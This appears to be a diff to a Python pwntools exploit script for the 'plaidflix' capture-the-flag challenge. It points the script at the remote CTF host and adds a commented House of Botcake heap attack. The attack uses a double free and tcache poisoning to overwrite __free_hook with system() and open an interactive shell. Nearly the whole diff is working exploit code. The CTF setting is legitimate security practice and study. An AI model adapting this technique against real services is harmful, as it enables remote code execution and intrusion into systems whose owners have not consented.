@@ -4,7 +4,7 @@ import re
 
 class MenuNavigator:
     def __init__(self):
-        self.p = process('./plaidflix')
+        self.p = remote('plaidflix.pwni.ng', '1337')
 
     def read_prompt(self):
         menu_str = self.p.recvuntil('\n> ')
@@ -55,8 +55,22 @@ class MenuNavigator:
         self.send_option(b'Manage movies')
         return self.send_option(b'Show movies')
 
+    def add_feedback(self, content):
+        self.send_option(b'Add feedback')
+        self.send_raw(content)
+
+    def remove_feedback(self, idx):
+        self.send_option(b'Delete feedback')
+        self.send_raw(f'{idx}'.encode())
+
+    def add_contact_details(self, content):
+        self.send_option(b'Add contact details')
+        self.send_raw(content)
+
 
 MAX_FRIEND_COUNT = 8
+TCACHE_LIMIT = 7
+MAX_FEEDBACK_COUNT = 10
 
 
 def leak_addrs(mn):
@@ -115,6 +129,70 @@ def leak_addrs(mn):
     return leaks
 
 
+def pop_shell(mn, heap_base, libc_base):
+    mn.send_option(b'Delete Account')
+    mn.send_raw(b'y')
+
+    # This is more or less House of Botcake:
+    # https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_botcake.c
+    # We only interact with two bins: the tcache bin for size 0x110 (the size of feedback)
+    # and the unsorted bin.
+
+    # Fill every chunk with the payload for system(), so that we don't have to care which
+    # chunk we use to pop shell.
+    for idx in range(MAX_FEEDBACK_COUNT):
+        mn.add_feedback('/bin/sh')
+
+    # The tcache bin is now full.
+    for idx in range(TCACHE_LIMIT):
+        mn.remove_feedback(idx)
+
+    # Put the second-to-last and third-to-last chunks into the unsorted bin.
+    # glibc helpfully consolidates them into a free megachunk of size 0x110 * 2.
+    # The last chunk serves as a padding to prevent the megachunk from consolidating
+    # with the top chunk.
+    mn.remove_feedback(TCACHE_LIMIT)
+    mn.remove_feedback(TCACHE_LIMIT + 1)
+
+    # Add a dummy feedback to free up some space in the tcache bin.
+    mn.add_feedback(b'DUMMY')
+    # The actual vulnerability: we can free the second-to-last chunk twice.
+    # glibc puts it into the tcache bin, but it remains a part of the megachunk.
+    mn.remove_feedback(TCACHE_LIMIT + 1)
+
+    # By allocating contact details (a chunk of size 0x130) from the megachunk, we are able
+    # to modify the second-to-last chunk in the tcache bin in to point at __free_hook as its next chunk.
+    free_hook_ptr = libc_base + 0x1e6e40
+    system_ptr = libc_base + 0x503c0
+
+    # Since fd pointers in the tcache bin are protected by PROTECT_PTR(), we need to protect
+    # our pointer to __free_hook, using the leaked heap base.
+    chunk_next_ptr = heap_base + 0x1240
+    protected_free_hook_ptr = (chunk_next_ptr >> 12) ^ free_hook_ptr
+
+    evil_details = b''.join([
+        # Overwrite the third-to-last chunk with CC bytes for visual debugging.
+        b'\xCC' * 0x100,
+        # prev_size of the second-to-last chunk.
+        p64(0x0),
+        # size of the second-to-last chunk.
+        p64(0x110),
+        # fd pointer of the second-to-last chunk.
+        p64(protected_free_hook_ptr),
+    ])
+    mn.add_contact_details(evil_details)
+
+    # Pop the second-to-last chunk off the tcache bin and ignore it.
+    mn.add_feedback(b'DUMMY')
+    # Pop __free_hook off the tcache bin and set it to the address of system().
+    mn.add_feedback(p64(system_ptr))
+
+    # We now free the very last chunk (that served as padding) to call __free_hook("/bin/sh").
+    mn.p.sendline(b'1')
+    mn.p.sendline('9'.encode())
+    mn.p.interactive()
+
+
 if __name__ == '__main__':
     mn = MenuNavigator()
     mn.read_prompt()
@@ -128,3 +206,5 @@ if __name__ == '__main__':
     libc_base = libc_leak - 0x1e3c80
     print(f'heap base: {heap_base:x}')
     print(f'glibc base: {libc_base:x}')
+
+    pop_shell(mn, heap_base, libc_base)
